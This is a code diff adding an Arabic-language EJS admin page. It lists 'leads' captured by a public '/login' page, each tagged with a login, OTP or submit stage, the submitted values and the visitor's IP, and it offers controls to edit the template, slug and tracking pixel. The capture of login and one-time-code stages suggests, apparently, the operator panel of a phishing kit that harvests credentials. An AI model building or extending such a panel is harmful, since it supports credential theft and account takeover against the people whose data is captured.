@@ -1,0 +1,103 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title><%= page.title %> — إدارة</title>
+<style>
+  * { box-sizing:border-box; }
+  body { font-family:system-ui,Tahoma; background:#0b0f19; color:#eef2ff; margin:0; padding:28px; }
+  .wrap { max-width:1000px; margin:auto; }
+  a { color:#8ab4ff; text-decoration:none; }
+  h2 { margin:28px 0 14px; color:#8ab4ff; font-size:1.1rem; }
+  table { width:100%; border-collapse:collapse; background:#151b2b; border-radius:14px; overflow:hidden; margin-bottom:28px; }
+  th,td { padding:12px 14px; text-align:right; border-bottom:1px solid #ffffff10; font-size:.88rem; }
+  th { background:#1c2436; }
+  label { display:grid; gap:6px; font-size:.88rem; margin-bottom:12px; }
+  input,select { width:100%; padding:11px; border-radius:9px; border:1px solid #ffffff22; background:#ffffff0d; color:#eef2ff; font-family:inherit; font-size:.95rem; }
+  .btn { background:#5b8cff; color:#fff; padding:10px 18px; border:0; border-radius:9px; cursor:pointer; font-size:.9rem; }
+  .btn-del { background:#ef4444; }
+  .badge { padding:3px 10px; border-radius:99px; font-size:.78rem; }
+  .on { background:#16a34a33; color:#4ade80; }
+  .off { background:#ef444433; color:#f87171; }
+  .grid2 { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
+  .section { background:#151b2b; padding:20px; border-radius:14px; margin-bottom:20px; }
+  .section h3 { font-size:1rem; margin:0 0 14px; color:#8ab4ff; }
+  .lead-data { font-size:.82rem; max-width:320px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+  @media(max-width:600px) { .grid2 { grid-template-columns:1fr; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <p style="margin-bottom:18px"><a href="/admin">← لوحة التحكم</a></p>
+
+  <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:20px">
+    <div>
+      <h1 style="margin:0 0 6px;font-size:1.5rem"><%= page.title %></h1>
+      <p style="opacity:.6;font-size:.9rem;margin:0">
+        القالب: <b><%= page.template_name %></b> &nbsp;|&nbsp;
+        <span class="badge <%= page.active ? 'on' : 'off' %>"><%= page.active ? 'شغالة' : 'موقوفة' %></span> &nbsp;|&nbsp;
+        👁 <b><%= page.views %></b> مشاهدة
+      </p>
+    </div>
+    <a href="/p/<%= page.slug %>/login" target="_blank" class="btn">🔗 عرض الصفحة</a>
+  </div>
+
+  <!-- Leads Table -->
+  <h2>الليدز (<%= leads.length %>)</h2>
+  <% if (leads.length) { %>
+    <table>
+      <tr><th>#</th><th>المرحلة</th><th>البيانات</th><th>IP</th><th>التاريخ</th></tr>
+      <% leads.forEach(l => {
+        let d = {}; try { d = JSON.parse(l.data); } catch {}
+        const step = d.step || 'submit';
+        delete d.step; delete d._csrf;
+        const preview = Object.entries(d).map(([k,v]) => `${k}: ${v}`).join(' • ');
+      %>
+        <tr>
+          <td><%= l.id %></td>
+          <td><span class="badge <%= step === 'login' ? 'on' : step === 'otp' ? '' : 'on' %>" style="<%= step==='otp'?'background:#1e3a5f33;color:#60a5fa':'' %>"><%= step %></span></td>
+          <td class="lead-data" title="<%= preview %>"><%= preview %></td>
+          <td style="font-size:.8rem;opacity:.6"><%= l.ip %></td>
+          <td style="font-size:.8rem;opacity:.6"><%= l.created_at %></td>
+        </tr>
+      <% }) %>
+    </table>
+  <% } else { %>
+    <p style="opacity:.5;margin-bottom:28px">مفيش ليدز لسه.</p>
+  <% } %>
+
+  <!-- Edit Form -->
+  <div class="section">
+    <h3>✏️ تعديل الصفحة</h3>
+    <form method="POST" action="/admin/pages/<%= page.id %>">
+      <input type="hidden" name="_csrf" value="<%= csrfToken %>">
+      <div class="grid2">
+        <label>العنوان<input name="title" value="<%= page.title %>" required></label>
+        <label>السلاج<input name="slug" value="<%= page.slug %>" required></label>
+      </div>
+      <label>رقم القالب<input name="template_id" value="<%= page.template_id %>"></label>
+      <label>حقول الليد<input name="fields" value='<%= page.fields %>'></label>
+      <input type="hidden" name="headline" value="<%= page.headline || '' %>">
+      <input type="hidden" name="subheadline" value="<%= page.subheadline || '' %>">
+      <input type="hidden" name="body" value="<%= page.body || '' %>">
+      <input type="hidden" name="button_text" value="<%= page.button_text || 'سجل الآن' %>">
+      <input type="hidden" name="theme" value="<%= page.theme || 'dark' %>">
+      <input type="hidden" name="pixel" value="<%= page.pixel || '' %>">
+      <label style="display:flex;gap:8px;align-items:center;flex-direction:row">
+        <input type="checkbox" name="active" value="1" <%= page.active ? 'checked' : '' %> style="width:auto">
+        <span>الصفحة مفعّلة</span>
+      </label>
+      <button type="submit" class="btn" style="margin-top:8px;width:auto;padding:10px 24px">💾 حفظ</button>
+    </form>
+  </div>
+
+  <div style="display:flex;gap:12px;flex-wrap:wrap">
+    <a href="/admin/templates?page_id=<%= page.id %>" class="btn">🎨 تغيير القالب</a>
+    <form method="POST" action="/admin/pages/<%= page.id %>/delete" onsubmit="return confirm('حذف الصفحة وكل الليدز؟')">
+      <button class="btn btn-del">🗑 حذف</button>
+    </form>
+  </div>
+</div>
+</body>
+</html>
